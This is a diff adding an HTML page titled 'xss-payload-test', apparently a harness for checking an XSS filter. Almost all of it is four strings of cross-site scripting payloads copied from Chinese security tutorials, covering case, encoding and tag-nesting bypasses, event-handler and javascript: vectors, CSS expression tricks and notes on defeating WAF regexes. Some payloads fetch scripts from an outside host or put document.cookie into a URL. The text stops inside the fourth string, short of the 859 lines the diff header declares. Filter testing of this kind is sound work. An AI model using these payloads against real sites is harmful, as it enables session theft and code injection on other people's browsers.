@@ -1,0 +1,859 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<meta name='viewport' content='width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no'/>
+	<script type="text/javascript" src="/static/js/falseReport.js"></script>
+	<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+	<script src="https://cdn.bootcss.com/vConsole/3.2.0/vconsole.min.js"></script>
+	<script src="https://cdn.bootcss.com/vue/2.5.16/vue.min.js"></script>
+	<script src="/static/js/uiworker-1.1.10.min.js"></script>
+	<script>
+	  // 初始化
+	  var vConsole = new VConsole();
+	  console.log('Hello world');
+	</script>
+	<style type="text/css"></style>
+	<title>xss-payload-test</title>
+</head>
+<body>
+	<div>
+		<button id="testBtnTest1">测试方案str1测试</button>
+		<button id="testBtnTest1Filter">测试方案str1测试Filter</button>
+		<br>
+		<button id="testBtnTest2">测试方案str2测试</button>
+		<button id="testBtnTest2Filter">测试方案str2测试Filter</button>
+		<br>
+		<button id="testBtnTest3">测试方案str3测试</button>
+		<button id="testBtnTest3Filter">测试方案str3测试Filter</button>
+		<br>
+		<button id="testBtnTest4">测试方案str4测试</button>
+		<button id="testBtnTest4Filter">测试方案str4测试Filter</button>
+		<br>
+		<button id="testBtnTest5">属性测试</button>
+		<button id="testBtnTest5Filter">属性测试Filter</button>
+		<br>
+	</div>
+	<div id="xssWarp"></div>
+	<script type="text/javascript">
+		//  https://websec.readthedocs.io/zh/latest/vuln/xss/payload.html
+		str1 = `
+			4.2.9. Payload
+			4.2.9.1. 常用
+			<script>alert(/xss/)<\/script>
+			<svg onload=alert(document.domain)>
+			<img src=document.domain onerror=alert(document.domain)>
+			<M onmouseover=alert(document.domain)>M
+			<marquee onscroll=alert(document.domain)>
+			<a href=javascript:alert(document.domain)>M</a>
+			<body onload=alert(document.domain)>
+			<details open ontoggle=alert(document.domain)>
+			<embed src=javascript:alert(document.domain)>
+			4.2.9.2. 大小写绕过
+			<script>alert(1)<\/script>
+			<sCrIpT>alert(1)<\/sCrIpT>
+			<ScRiPt>alert(1)<\/ScRiPt>
+			<sCrIpT>alert(1)<\/ScRiPt>
+			<ScRiPt>alert(1)<\/sCrIpT>
+			<img src=1 onerror=alert(1)>
+			<iMg src=1 oNeRrOr=alert(1)>
+			<ImG src=1 OnErRoR=alert(1)>
+			<img src=1 onerror="alert(&quot;M&quot;)">
+			<marquee onscroll=alert(1)>
+			<mArQuEe OnScRoLl=alert(1)>
+			<MaRqUeE oNsCrOlL=alert(1)>
+			4.2.9.3. 各种alert
+			<script>alert(1)<\/script>
+			<script>confirm(1)<\/script>
+			<script>prompt(1)<\/script>
+			<script>alert('1')<\/script>
+			<script>alert("1")<\/script>
+			<script>alert\`1\`<\/script>
+			<script>alert(1)<\/script>
+			<script>alert(1)<\/script>
+			<script>(alert)(1)<\/script>
+			<script>a=alert,a(1)<\/script>
+			<script>[1].find(alert)<\/script>
+			<script>top["al"+"ert"](1)<\/script>
+			<script>top["a"+"l"+"e"+"r"+"t"](1)<\/script>
+			<script>top[/al/.source+/ert/.source](1)<\/script>
+			<script>top[/a/.source+/l/.source+/e/.source+/r/.source+/t/.source](1)<\/script>
+			4.2.9.4. 伪协议
+			<a href=javascript:/0/,alert(%22M%22)>M</a>
+			<a href=javascript:/00/,alert(%22M%22)>M</a>
+			<a href=javascript:/000/,alert(%22M%22)>M</a>
+			<a href=javascript:/M/,alert(%22M%22)>M</a>
+			4.2.9.5. Chrome XSS auditor bypass
+			?param=https://&param=@z.exeye.io/import%20rel=import%3E
+			<base href=javascript:/M/><a href=,alert(1)>M</a>
+			<base href=javascript:/M/><iframe src=,alert(1)></iframe>
+			4.2.9.6. 长度限制
+			//Array.from('alert(1)').map(v=>\`<script>s+="\${v}"<\/script>\`).join('\n')
+			<script>s=""<\/script>
+			<script>s+="a"<\/script>
+			<script>s+="l"<\/script>
+			<script>s+="e"<\/script>
+			<script>s+="r"<\/script>
+			<script>s+="t"<\/script>
+			<script>s+="("<\/script>
+			<script>s+="1"<\/script>
+			<script>s+=")"<\/script>
+			<script>eval(s)<\/script>
+			4.2.9.7. jquery sourceMappingURL
+			</textarea><script>var a=1//@ sourceMappingURL=//xss.site<\/script>
+			4.2.9.8. 图片名
+			"><img src=x onerror=alert(document.cookie)>.gif
+			4.2.9.9. 过期的payload
+			src=javascript:alert基本不可以用
+			css expression特性只在旧版本ie可用
+			4.2.9.10. css
+			<div style="background-image:url(javascript:alert(/xss/))">
+			<STYLE>@import'https://www.lilnong.top/static/css/xss.css';</STYLE>
+			4.2.9.11. markdown
+			[a](javascript:prompt(document.cookie))
+			[a](j    a   v   a   s   c   r   i   p   t:prompt(document.cookie))
+			<&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
+			![a'"\`onerror=prompt(document.cookie)](x)
+			[notmalicious](javascript:window.onerror=alert;throw%20document.cookie)
+			[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=)
+			![a](data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=)
+			4.2.9.12. iframe
+			<iframe onload='
+			    var sc   = document.createElement("scr" + "ipt");
+			    sc.type  = "text/javascr" + "ipt";
+			    sc.src   = "https://www.lilnong.top/xss.js";
+			    document.body.appendChild(sc);
+			    '
+			/>
+			<iframe src=javascript:alert(1)></iframe>
+			<iframe src="data:text/html,<iframe src=javascript:alert('M')></iframe>"></iframe>
+			<iframe src=data:text/html;base64,PGlmcmFtZSBzcmM9amF2YXNjcmlwdDphbGVydCgiTWFubml4Iik+PC9pZnJhbWU+></iframe>
+			<iframe srcdoc=<svg/o&#x6E;load&equals;alert&lpar;1)&gt;></iframe>
+			<iframe src=https://lilnong.top width=1366 height=768></iframe>
+			<iframe src=javascript:alert(1) width=1366 height=768></iframe
+			4.2.9.13. form
+			<form action=javascript:alert(1)><input type=submit>
+			<form><button formaction=javascript:alert(1)>M
+			<form><input formaction=javascript:alert(1) type=submit value=M>
+			<form><input formaction=javascript:alert(1) type=image value=M>
+			<form><input formaction=javascript:alert(1) type=image src=1>
+			4.2.9.14. meta
+			<META HTTP-EQUIV="Link" Content="<http://ha.ckers.org/xss.css>; REL=stylesheet">
+		`
+	</script>
+	<script type="text/javascript">
+		// https://www.jianshu.com/p/de731b35ef10
+		str2 = `
+			<script>alert(111740.57267507828);<\/script>
+			<script>alert('XSS');<\/script>
+			<script>alert("https://www.lilnong.top/cookie.php?cookie="+escape(document.cookie))<\/script>
+			<scr<script>ipt>alert(111740.57267507828);<\/scr<\/script>ipt>
+			<script>alert(String.fromCharCode(88,83,83))<\/script>
+			"><script>alert(111740.57267507828)<\/script>
+			<\/title><script>alert(/111740.57267507828/)<\/script>
+			<\/textarea><script>alert(/111740.57267507828/)<\/script>
+			<? echo('<scr');echo('ipt>alert("111740.57267507828")<\/script');?>
+			<marquee><script>alert('111740.57267507828')<\/script><\/marquee>
+			<script language="JavaScript">alert('111740.57267507828')<\/script>
+			"><script alert(String.fromCharCode(88,83,83))<\/script>
+			'">><script>alert('111740.57267507828')<\/script>
+			<script>var var=111740.57267507828;alert(var)<\/script>
+			<?='<SCRIPT>alert("111740.57267507828")<\/SCRIPT>'?>
+			<scrscriptipt>alert(111740.57267507828)<\/scrscriptipt>
+			<\/script><script>alert(111740.57267507828)<\/script>
+			'"><\/title><script>alert(111740.57267507828)<\/script>
+			<\/textarea>'"><script>alert(document.cookie)<\/script>
+			'""><script language="JavaScript">alert('XS');<\/script>
+			<\/script><\/script><<<<script><>>>><<<script>alert(111740.57267507828)<\/script>
+			<html><noalert><noscript>alert(111740.57267507828)<\/script>
+			}<\/style><script>a=eval;a=eval;b=alert;a(b(/111740.57267507828/.source));<\/script>
+			<SCRIPT>document.write("111740.57267507828");<\/SCRIPT>
+			='><script>alert("111740.57267507828")<\/script>
+			<body background=javascript:'"><script>alert(navigator.userAgent)<\/script><\/body>
+			>"><script>alert(/111740.57267507828/)<\/script>
+			"><\/title><script>alert(111740.57267507828)<\/script>
+			<\/div><script>alert(111740.57267507828)<\/script>
+			"><\/iframe><script>alert(111740.57267507828)<\/script>
+			'><\/select><script>alert(111740.57267507828)<\/script>
+			<img src=foo.png onerror=alert(/111740.57267507828/) />
+			<IMG SRC="jav&#x09;ascript:alert('111740.57267507828');">
+			<IMG SRC="jav&#x0A;ascript:alert('111740.57267507828');">
+			<IMG SRC="jav&#x0D;ascript:alert('111740.57267507828');">
+			<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
+			<IMG LOWSRC="javascript:alert('111740.57267507828')">
+			<IMG DYNSRC="javascript:alert('111740.57267507828')">
+			<img src="javascript:alert('111740.57267507828')">
+			<IMG SRC='vbscript:msgbox("111740.57267507828")'>
+			"<marquee><img src=k.png onerror=alert(/111740.57267507828/) />
+			"<marquee><img src=k onerror=alert(/111740.57267507828/) />
+			'"><marquee><img src=k.png onerror=alert(/111740.57267507828/.source) />
+			<img src="javascript:alert("111740.57267507828")">
+			>"><img src="javascript:alert('111740.57267507828')">
+			"/><\/a><\/><img src=1.gif onerror=alert(111740.57267507828)>
+			window.alert("111740.57267507828");
+			<iframe<?php echo chr(11)?>onload=alert('111740.57267507828')><\/iframe>
+			"><iframe src='javascript:alert(document.cookie)'><\/iframe>
+			'>><marquee><h1>111740.57267507828<\/h1><\/marquee>
+			'">><marquee><h1>111740.57267507828<\/h1><\/marquee>
+			<font style='color:expression(alert(document.cookie))'>
+			<div style="x:expression((windows.r==1)?":eval('r=1;alert(String.fromCharCode(88,83,83));'))">
+			<div style="background:url('javascript:alert(111740.57267507828)')">
+			" style="background:url(javascript:alert(/111740.57267507828/))"
+			<\/br style=a:expression(alert())>
+			<body onunload="javascript:alert('111740.57267507828');">
+			<body onLoad="alert('111740.57267507828');">
+			" onfous=alert(document.domain)"><"
+			"><BODY onload!#$%&()*~+-_.,:;?@[/|]^\`=alert("111740.57267507828")>
+			<body onLoad="while(true) alert('111740.57267507828');">
+			<SELECT NAME="" onmouseover=alert(111740.57267507828)><\/select>
+			'"><\/title><font color=red onmouseover=javascript:alert(1337)>111740.57267507828<\/font>
+			<META HTTP-EQUIV='refresh' CONTENT='0;url=javascript:alert(/111740.57267507828/');">
+			<META HTTP-EQUIV='refresh' CONTENT='0;URL=http://;URL=javascript:alert(/111740.57267507828/);'>
+			<BASE HREF="javascript:alert('111740.57267507828');//">
+			<FRAMESET><FRAME SRC="javascript:alert('111740.57267507828');"><\/FRAMESET>
+			[url=javascript:alert('111740.57267507828');]click me[/url]
+			[color=red' onmouseover="alert('111740.57267507828')"]mouse over[/color]
+			[color=red width=expression(alert(111740.57267507828))][color]
+		`
+	</script>
+
+	<script type="text/javascript">
+		// http://zone.secevery.com/?/article/328
+		str3 = `
+			";alert(1);//xx
+
+
+			¼script¾alert(¢XSS¢)¼/script¾   //US-ASCII编码，如Tomcat
+
+			<!--[if gte IE 4]>
+			<SCRIPT>alert('XSS');<\/SCRIPT>    //IE7以下
+			<![endif]-->
+
+			<\/title><script>alert(1);<\/script>
+
+
+
+			<a href="javascript:alert(1)">aaaa<\/a>
+			<a href="JavaSCript:alealertrt%25281%2529">aaaa<\/a>
+			<a onclick=alert(1)>XSS<\/a>
+			<a onmouseover=alert(1)>XSS<\/a>
+
+
+			<body onload=alert(1)>  //无需js标签，可直接执行
+			<body background="javascript:alert('XSS')">  //IE7以下
+
+
+			<DIV style="background-image: url(javascript:alert('XSS'))">  //IE7以下
+			<DIV style="width: expression(alert('XSS'));">
+
+
+			<embed src="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" allowscriptaccess="always"><\/embed>  //Firefox/Chrome
+
+
+
+			<iframe src="javascript:alert(1)"><\/iframe>
+			<iframe src="data:text/html,<script>alert(1)<\/script>"><\/iframe>    //Firefox/Chrome/Safari
+			<iframe src=# onmouseover="alert(document.cookie)"><\/iframe>
+
+
+
+			'"><img onmouseover=alert(1)>  //IE
+			<img onmouseover=alert(1) src>  //IE
+			<img src=x onmouseover=alert(1)>
+			<img src=x onerror=alert(1)>
+			<img/src=x onerror=alert(1)>
+			<img src=1 alt=al lang=ert onerror=top[url=1]alt+lang[/url]>
+			// 下面的img标签都是在IE7以下版本生效
+			<img src=JaVaScRiPt:alert(1)>
+			<img src=javascript:alert(String.fromCharCode(49))>
+			<img src=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
+			<img src=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
+			<img src=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
+			<img src=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
+			<img src="jav   ascript:alert('XSS')">  <!-- 这里空格是tab -->
+			<img src="jav&#x09;ascript:alert('XSS');"> <!-- &#x09;是tab -->
+			<img src="jav&#x0D;ascript:alert('XSS');"> <!-- &#x0D;是回车 -->
+			<img src=" &#14;  javascript:alert('XSS');">
+			<img DYNsrc="javascript:alert('XSS')">
+			<img LOWsrc="javascript:alert('XSS')">
+			<img src=\`javascript:alert('xxxxx')\`>
+			<img src='vbscript:msgbox("XSS")'>
+
+
+
+			<input type=image src=x onerror=alert(1)>
+			<input type="IMAGE" src="javascript:alert('XSS');"> //IE7以下
+
+
+			<link rel="stylesheet" href="javascript:alert('XSS');">  //IE7以下
+
+			<meta http-equiv="refresh" content="x;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">  //Firefox
+
+
+			<script>alert(1)<\/script>
+			<sCrIpt>alert(1)<\/ScRipt>
+			<sCrsCrIptIpt>alalertert(1)<\/ScRsCrIptipt>
+			<script>\u0061\u006C\u0065\u0072\u0074(1)<\/script>
+			<script>window[url=0]'alert'[/url]<\/script>
+			<script>parent[url=1]'alert'[/url]<\/script>
+			<script>self[url=2]'alert'[/url]<\/script>
+			<script>top[url=3]'alert'[/url]<\/script>
+			<script src=https://www.lilnong.top/1.js><\/script>
+			[quote]<\/script>">'><script>alert(String.fromCharCode(49))<\/script>
+			<<SCRIPT>alert(1);//<<\/SCRIPT>[/quote]
+
+
+
+			<style>li{list-style-image: url("javascript:alert('XSS')");}<\/style><ul><li>XSS<\/br>  //IE7以下
+			<style>a{width:expression(alert('11'))}<\/style><a href="x"><\/a>  //IE7以下
+			<style>.xss{background-image:url("javascript:alert('XSS')");}<\/style><a class=xss><\/a>  //IE7以下
+			<style type="text/css">BODY{background:url("javascript:alert('XSS')");}<\/style>  //IE7以下
+
+
+			<svg/onload=alert(1)>
+
+
+			<table BACKGROUND="javascript:alert('XSS')">  //IE7以下
+			<table><TD BACKGROUND="javascript:alert('XSS')">  //IE7以下
+			<div style="background-image: url(javascript:alert('XSS'));">  //IE7以下
+		`
+	</script>
+	<script type="text/javascript">
+		// https://blog.csdn.net/spang_33/article/details/80930046
+		str4 = `
+			XSS总结:
+			        xss分为三种，反射型xss，DOM型XSS及存储型XSS，不同类型的XSS的危害不同，有兴趣的可以观看一下csdn上明智讲的关于XSS攻击及原理。https://edu.csdn.net/course/detail/8585里面的修复原理和补丁代码讲的还是很详细的，他的课程还有利用xss获取cookie等。
+			<img src=x onerror=alert(1)>
+			通杀标签payload：
+			<aaaa id="c" onfocus="alert(1)" tabindex=0>
+			1、script标签
+			绕过进行一次移除操作：
+			<scr<script>ipt>alert("XSS")</scr<script>ipt>
+			Script 标签可以用于定义一个行内的脚本或者从其他地方加载脚本：
+			<script>alert("XSS")<\/script>
+			<script src="https://www.lilnong.top/malicious.js"><\/script>
+
+			1.2 JavaScript 事件
+			我们可以像如下这样在元素中定义 JavaScript 事件：
+			<div onclick="alert('xss')">
+			这个 JavaScript 代码当有人点击它后就会被执行，同时还有其他事件如页面加载或移动鼠标都可以触发这些事件。绝大部分的时间都被过滤器所移除了，但是依旧还有少量事件没有被过滤，例如，onmouseenter 事件：<divonmouseenter="alert('xss')">当用户鼠标移动到 div 上时就会触发我们的代码。
+			另一个绕过的办法就是在属性和= 之间插入一个空格：
+			<div onclick ="alert('xss')">
+
+			1.3 行内样式(Inlinestyle)
+			我们同样可以在行内样式里利用 IE 浏览器支持的动态特性：//IE5之后才支持
+			<div style="color: expression(alert('XSS'))">//experssion后执行的语句相当于javascript后执行的语句
+			过滤器会检查关键字 style，随后跟随的不能是 <，在随后是 expression：
+			/style=[^<]*((expression\s*?[<]∗?)|(behavior\s*:))[^<]*(?=\>)/Uis
+			所以，让我们需要把 < 放到其他地方：
+			<div style="color: '<'; color: expression(alert('XSS'))">
+
+			1.4 CSS import
+			IE 浏览器支持在 CSS 中扩展 JavaScript，这种技术称为动态特性(dynamic properties)。允许攻击者加载一个外部 CSS 样式表是相当危险的，因为攻击者现在可以在原始页面中执行 JavaScript 代码了。
+			<style>
+			@import url("https://www.lilnong.top/malicious.css");
+			<\/style>
+			malicious.css：
+			body {
+			    color: expression(alert('XSS'));
+			}
+			为了绕过对 @import 的过滤，可以在 CSS 中使用反斜杠进行绕过：
+			<style>
+			@imp\ort url("https://www.lilnong.top/malicious.css");
+			<\/style>
+			IE 浏览器会接受反斜杠，但是我们绕过了过滤器。
+			1.5 Javascript URL
+			链接标签里可以通过在 URL 中使用 javascript:… 来执行 JavaScript：
+			<a href="javascript:alert('test')">link<\/a>
+			上面的过滤会从代码中移除 javascript:，所以我们不能直接这么写代码。但我们可以尝试改变 javascript:的写法，使它依旧可以被浏览器执行但又不匹配正则表达式。首先来尝试下 URL 编码：
+			<a href="Java&#115;cript:alert('xss')">link<\/a>
+			上面这段代码不匹配正则表达式，但是浏览器依旧会执行它，因为浏览器会首先进行 URL 解码操作。
+			另外，我们还可以使用 VBScript，虽然它在 IE11 中被禁用了，但依旧可以运行在旧版本的 IE 或者启用兼容模式的 IE11 上。我们可以使用类似上面 JavaScript 的方式来插入 VBScript 代码：
+			<a href='vbscript:MsgBox("XSS")'>link<\/a>
+			'-confirm\`1\`-'
+			'-confirm(1)-'
+			1.6 利用字符编码
+			%c1;alert(/xss/);//
+
+			1.7 绕过长度限制
+			"onclick=alert(1)//
+			"><!--
+			--><script>alert(xss);<script>
+
+			1.8 使用<base>标签
+			<script>alert(navigator.userAgent)<script>
+			<script>alert(88199)<\/script>
+			<script>confirm(88199)<\/script>
+			<script>prompt(88199)<\/script>
+			<script>\u0061\u006C\u0065\u0072\u0074(88199)<\/script>
+			<script>+alert(88199)<\/script>
+			<script>alert(/88199/)<\/script>
+			<script src=data:text/javascript,alert(88199)><\/script>
+			<scriptsrc=&#100&#97&#116&#97:text/javascript,alert(88199)><\/script>
+			<script>alert(String.fromCharCode(49,49))<\/script>
+			<script>alert(/88199/.source)<\/script>
+			<script>setTimeout(alert(88199),0)<\/script>
+			<script>console['log'](88199);<\/script>
+
+			<anytag onmouseover=alert(15)>M
+			<anytag onclick=alert(16)>M
+			<a onmouseover=alert(17)>M
+			<a onclick=alert(18)>M
+			<a href=javascript:alert(19)>M
+			<button/onclick=alert(20)>M
+			<form><button
+			formaction=javascript&colon;alert(21)>M
+			<form/action=javascript:alert(22)><input/type=submit>
+			<form onsubmit=alert(23)><button>M
+			<form onsubmit=alert(23)><button>M
+			<img src=x onerror=alert(24)> 29
+			<body/onload=alert(25)>
+
+			<body
+			onscroll=alert(26)><br><br><br><br><br><br><br>
+			<br><br><br><br><br><br><br><br><br><br><br>
+			<br><br><br><br><br><br><br><br><br><br><br>
+			<br><br><br><br><br><br><br><br><br><br><br>
+			<input autofocus>
+
+			<iframe src="https://www.lilnong.top/xss.swf"><\/iframe>
+			<iframe/onload=alert(document.domain)><\/iframe>
+			<IFRAME SRC="javascript:alert(29);"><\/IFRAME>
+			<meta http-equiv="refresh" content="0;
+			url=data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%2830%29%3C%2%73%63%72%69%70%74%3E">^_^
+			<object data=data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+><\/object>
+			<object data="javascript:alert(document.domain)">
+
+
+			<marquee onstart=alert(30)><\/marquee>
+			<isindex type=image src=1 onerror=alert(31)>
+			<isindex action=javascript:alert(32) type=image>
+			<input onfocus=alert(33) autofocus>
+			<input onblur=alert(34) autofocus><input autofocus>
+			2.2.1 如果大小写不行的话，<script>被过滤尝试<scr<script>ipt>alert(1)<\/scr<script>ipt>；
+			2.2.2使用<a>标签测试
+			<a  href=“http://www.google.com">Clickme<\/a>
+			<a被过滤？
+			href被过滤？
+			其他内容被过滤？
+			如果没有过滤尝试使用
+			<a href=”javascript:alert(1)”>Clickme<\/a>
+			尝试使用错误的事件查看过滤
+			<a href="rhainfosec.com"onclimbatree=alert(1)>ClickHere<\/a>
+			HTML5拥有150个事件处理函数，可以多尝试其他函数
+			<body/onhashchange=alert(1)><a href=#>clickit
+
+
+			2.3 测试其他标签
+			src属性
+			<img src=x      onerror=prompt(1);>
+			<img/src=aaa.jpg      onerror=prompt(1);
+			<video src=x      onerror=prompt(1);>
+			<audio src=x      onerror=prompt(1);>
+			iframe
+			<iframesrc="javascript:alert(2)">
+			<iframe/src="data:text&sol;html;&Tab;base64&NewLine;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==">
+			Embed
+			<embed/src=//goo.gl/nlX0P>
+			Action
+			<form action="Javascript:alert(1)"><input type=submit>
+			<isindex action="javascript:alert(1)" type=image>
+			<isindexaction=j&Tab;a&Tab;vas&Tab;c&Tab;r&Tab;ipt:alert(1)type=image>
+			<isindex action=data:text/html, type=image>
+			mario验证
+			<span class="pln">    <\/span><spanclass="tag">&lt;formaction<\/span><spanclass="pun">=<\/span><spanclass="atv">&amp;#039;data:text&amp;sol;html,&amp;lt;script&amp;gt;alert(1)&amp;lt/script&amp;gt&amp;#039;<\/span><spanclass="tag">&gt;&lt;button&gt;<\/span><spanclass="pln">CLICK<\/span>
+			“formaction”属性
+			<isindexformaction="javascript:alert(1)"     type=image>
+			<input type="image" formaction=JaVaScript:alert(0)>
+			 <form><buttonformaction=javascript&colon;alert(1)>CLICKME
+			“background”属性
+			<table background=javascript:alert(1)><\/table> // Works on Opera10.5      and IE6
+			“posters” 属性
+			<video poster=javascript:alert(1)//><\/video> // Works Upto Opera10.5
+			“data”属性
+			<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=">
+			<object/data=//goo.gl/nlX0P?
+			“code”属性
+			<applet code="javascript:confirm(document.cookie);"> // FirefoxOnly
+			<embed  code="http://businessinfo.co.uk/labs/xss/xss.swf"     allowscriptaccess=always>
+			事件处理
+			<svg/onload=prompt(1);>
+			<marquee/onstart=confirm(2)>/
+			<body onload=prompt(1);>
+			<select autofocus onfocus=alert(1)>
+			<textarea autofocus onfocus=alert(1)>
+			<keygen autofocus onfocus=alert(1)>
+			<video><source onerror="javascript:alert(1)">
+			短payload
+			<q/oncut=open()>
+			<q/oncut=alert(1)> //      Useful in-case of payloadrestrictions.
+			嵌套欺骗
+			<marquee<marquee/onstart=confirm(2)>/onstart=confirm(1)>
+			<body  language=vbsonload=alert-1 // Works with IE8
+			<commandonmouseover="\\x6A\\x61\\x76\\x61\\x53\\x43\\x52\\x49\\x50\\x54\\x26\\x63\\x6F\\x6C\\x6F\\x6E\\x3B\\x63\\x6F\\x6E\\x66\\x6  9\\x72\\x6D\\x26\\x6C\\x70\\x61\\x72\\x3B\\x31\\x26\\x72\\x70\\x61\\x72\\x3B">Save<\/command>     // Works with IE8
+			圆括号被过滤
+			<a onmouseover="javascript:window.onerror=alert;throw 1">
+			<img src=x onerror="javascript:window.onerror=alert;throw 1">
+			<body/onload=javascript:window.onerror=eval;throw&#039;=alert\x281\x29&#039;;
+			Expression 属性
+			<img style="xss:expression(alert(0))"> // Works upto IE7.
+			<div style="color:rgb(&#039;&#039;x:expression(alert(1))"><\/div>     // Works upto IE7.
+			<style>#test{x:expression(alert(/XSS/))}<\/style>     // Works upto IE7
+			“location”属性
+			<a onmouseover=location=’javascript:alert(1)>click
+			<body onfocus="location=&#039;javascrpt:alert(1) >123
+			其他Payload
+			<meta http-equiv="refresh"     content="0;url=//goo.gl/nlX0P">
+			<meta http-equiv="refresh"     content="0;javascript&colon;alert(1)"/>
+			<svg xmlns="http://www.w3.org/2000/svg"><g     onload="javascript:\u0061lert(1);"><\/g><\/svg> //     By @secalert
+			<svg xmlns:xlink=" r=100 /><animateattributeName="xlink:href"     values=";javascript:alert(1)" begin="0s"     dur="0.1s" fill="freeze"/> // By Mario
+			<svg><![CDATA[><imagexlink:href="]]><img/src=xx:xonerror=alert(2)//"<\/svg>     // By @secalert
+			<meta content="&NewLine; 1 &NewLine;;JAVASCRIPT&colon;alert(1)" http-equiv="refresh"/>
+			<math><a xlink:href="//jsfiddle.NET/t846h/">click // ByAshar Javed
+			（）；：被过滤
+			<svg><script>alert&#40/1/&#41<\/script>     // Works With All Browsers
+			( is html encoded to &#40
+			 ) is html encoded to &#41
+			Opera的变量
+			<svg><script>alert&#40      1&#41 // Workswith Opera Only
+			实体解码
+			&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+			<a href="j&#x26;#x26#x41;vascript:alert%252831337%2529">Hello<\/a>
+			编码
+			JavaScript是很灵活的语言，可以使用十六进制、Unicode、HTML等进行编码，以下属性可以被编码
+			（支持HTML, Octal, Decimal,Hexadecimal, and Unicode）
+			href=
+			action=
+			formaction=
+			location=
+			on*=
+			name=
+			background=
+			poster=
+			src=
+			code=
+			data= //只支持base64
+
+
+			2.4 基于上下文的过滤
+			WAF最大的问题是不能理解内容，使用黑名单可以阻挡独立的js脚本，但仍不能对xss提供足够的保护，如果一个反射型的XSS是下面这种形式
+
+			2.4.1 输入反射属性
+			<inputvalue="XSStest" type=text>
+			我们可以使用 “><imgsrc=x  onerror=prompt(0);>触发，但是如果<>被过滤，我们仍然可以使用“ autofocusonfocus=alert(1)//触发，基本是使用“ 关闭value属性，再加入我们的执行脚本
+			" onmouseover="prompt(0) x="
+			" onfocusin=alert(1)     autofocus x="
+			" onfocusout=alert(1)     autofocus x="
+			" onblur=alert(1) autofocus     a="
+			输入反射在<script>标签内
+			类似这种情况：
+			<script>
+			Var
+			x=”Input”;
+			<\/script>
+			通常，我们使用“><\/script>,闭合前面的<\/script>标签，然而在这种情况，我们也可以直接输入执行脚本alert(), prompt()
+			confirm() ，例如：
+			“;alert(1)//
+			2.4.3 超文本内容
+			代码中的情况如下
+			<a
+			href=”Userinput”>Click<\/a>
+			可以使用javascript:alert(1)//直接执行<a
+			href=”javascript:alert(1)//”>Click<\/a>
+			2.4.4 变形
+			主要包含大小写和JavaScript变形
+			javascript&#058;alert(1)
+			javaSCRIPT&colon;alert(1)
+			JaVaScRipT:alert(1)
+			javas&Tab;cript:\u0061lert(1);
+			javascript:\u0061lert&#x28;1&#x29
+			avascript&#x3A;alert&lpar;document&period;cookie&rpar;     // AsharJaved
+			IE10以下和URI中可以使用VBScript
+			vbscript:alert(1);
+			vbscript&#058;alert(1);
+			vbscr&Tab;ipt:alert(1)"
+			Data URl
+			data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+			2.4.5JSON内容
+			反射输入
+			encodeURIComponent(&#039;userinput&#039;)
+			可以使用
+			-alert(1)-
+			-prompt(1)-
+			-confirm(1)-
+			结果
+			encodeURIComponent(&#039;&#039;-alert(1)-&#039;&#039;)
+			encodeURIComponent(&#039;&#039;-prompt(1)-&#039;&#039;)
+
+			2.4.6 输入反射在svg标签内
+			源码如下：
+			<svg><script>varmyvar=”YourInput”;<\/script><\/svg>
+			可以输入
+			www.site.com/test.PHP?var=text”;alert(1)//
+			如果系统编码了”字符
+			<svg><script>varmyvar="text&quot;;alert(1)//";<\/script><\/svg>
+			原因是引入了附加的（XML）到HTML内容里，可以使用2次编码处理
+			浏览器BUG
+			2.4.7 字符集BUG
+			字符集BUG在IE中很普遍，最早的bug是UTF-7。如果能控制字符集编码，我们可以绕过99% 的WAF过滤。
+			示例
+			http://xsst.sinaapp.com/utf-32-1.php?charset=utf-8&v=XSS
+			可以控制编码，提交
+			http://xsst.sinaapp.com/utf-32-1.php?charset=utf-8&v=”><img
+			src=x onerror=prompt(0);>
+			可以修改为UTF-32编码形式
+			???script?alert(1)?/script?
+			http://xsst.sinaapp.com/utf-32-1.php?charset=utf-32&v=%E2%88%80%E3%B8%80%E3%B0%80script%E3%B8%80alert(1)%E3%B0%80/script%E3%B8%80
